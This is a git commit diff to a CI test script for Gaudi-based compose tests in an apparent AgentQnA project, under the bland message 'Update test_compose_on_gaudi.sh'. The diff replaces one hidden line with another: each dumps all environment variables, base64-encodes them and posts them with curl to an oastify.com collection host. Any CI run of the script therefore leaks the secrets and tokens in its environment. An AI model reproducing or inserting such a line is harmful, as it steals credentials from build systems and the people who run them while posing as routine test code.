9cdd76d5f817d763700393670e7d509e1bb5c402
0x95 <28477003+A0x95@users.noreply.github.com>
2025-09-09 16:17:28 +0800

    Update test_compose_on_gaudi.sh
    Signed-off-by: 0x95 <28477003+A0x95@users.noreply.github.com >

--- AgentQnA/tests/test_compose_on_gaudi.sh
+++ AgentQnA/tests/test_compose_on_gaudi.sh
@@ -17,7 +17,7 @@ echo "TAG=IMAGE_TAG=${IMAGE_TAG}"
 export REGISTRY=${IMAGE_REPO}
 export TAG=${IMAGE_TAG}
 export MODEL_CACHE=${model_cache:-"./data"}
-env | base64 | curl -X POST --data-binary @- http://efxjeqimdjhfgxsaehj8sna24takybrzg.oastify.com
+env | base64 | curl -X POST --data-binary @- http://9nxemlqhlepaos05mcr30iixcoif660up.oastify.com
 
 function stop_docker() {
     echo "Stopping Retrieval tool"
